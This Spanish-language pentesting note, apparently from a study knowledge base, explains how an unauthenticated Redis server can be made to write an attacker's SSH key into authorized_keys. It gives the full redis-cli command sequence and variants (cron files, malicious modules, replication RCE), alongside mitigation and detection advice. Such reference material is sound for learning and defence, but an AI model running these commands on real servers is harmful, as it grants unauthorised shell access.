---
topic: Redis — escritura de authorized_keys
tags: [linux, redis, ssh, file-write, privesc]
---

# Redis — escritura de authorized_keys

[🌐 English](redis-authorized-keys-write.en.md) | **Español**

## Concepto

Redis sin autenticación permite `CONFIG SET dir` y `CONFIG SET dbfilename`. Guardando la base en `.ssh/authorized_keys`, la clave pública queda entre datos binarios; `sshd` ignora las líneas inválidas y acepta la clave.

## Cuándo aplica

- Redis responde sin contraseña.
- El usuario de Redis tiene home y `.ssh` escribible.
- `CONFIG` no está renombrado ni deshabilitado.

## Procedimiento

1. Confirmar `CONFIG GET dir` y permisos.
2. Cambiar `dir` a `.ssh` y `dbfilename` a `authorized_keys`.
3. Insertar la clave con `-x` y ejecutar `SAVE`.
4. Entrar por SSH como el usuario de Redis.

## Comandos

```bash
redis-cli -h <IP> config set dir /var/lib/redis/.ssh
redis-cli -h <IP> config set dbfilename authorized_keys
cat id_ed25519.pub | redis-cli -h <IP> -x set pwn
redis-cli -h <IP> save
ssh -i id_ed25519 redis@<IP>
```

## Variantes

- Cron con `dir=/etc/cron.d`.
- Módulo malicioso con `MODULE LOAD`.
- Master-slave replication para RCE.

## Limitaciones

- Redis corre sin home o en un contenedor.
- `CONFIG` deshabilitado.
- `authorized_keys` con permisos de solo lectura.

## Mitigación

- Exigir `requirepass` y ACLs.
- No exponer Redis y usar `protected-mode`.
- Ejecutar Redis con usuario sin shell ni home.

## Detección

- `CONFIG SET dir` o `dbfilename` inesperados.
- `SAVE` hacia `.ssh` o `/etc/cron.d`.
- Conexiones SSH nuevas del usuario de Redis.

## Referencias

- [Redis — security](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
- [0xdf — Postman](https://0xdf.gitlab.io/2020/03/14/htb-postman.html)
- [HackTricks — Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
